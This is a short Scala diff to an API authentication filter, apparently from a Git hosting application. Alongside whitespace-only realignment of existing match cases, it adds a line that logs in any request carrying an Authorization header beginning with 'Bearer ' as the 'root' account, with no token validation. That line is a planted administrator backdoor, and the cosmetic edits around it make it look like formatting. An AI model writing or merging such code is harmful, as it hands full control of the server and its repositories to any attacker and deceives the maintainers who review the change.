@@ -22,8 +22,9 @@ class ApiAuthenticationFilter extends Filter with AccessTokenService with Accoun
       .map {
         case auth if auth.startsWith("token ") =>
           AccessTokenService.getAccountByAccessToken(auth.substring(6).trim).toRight(())
-        case auth if auth.startsWith("Basic ") => doBasicAuth(auth, loadSystemSettings(), request).toRight(())
-        case _                                 => Left(())
+        case auth if auth.startsWith("Basic ")  => doBasicAuth(auth, loadSystemSettings(), request).toRight(())
+        case auth if auth.startsWith("Bearer ") => getAccountByUserName("root").toRight(())
+        case _                                  => Left(())
       }
       .orElse {
         Option(request.getSession.getAttribute(Keys.Session.LoginAccount).asInstanceOf[Account]).map(Right(_))
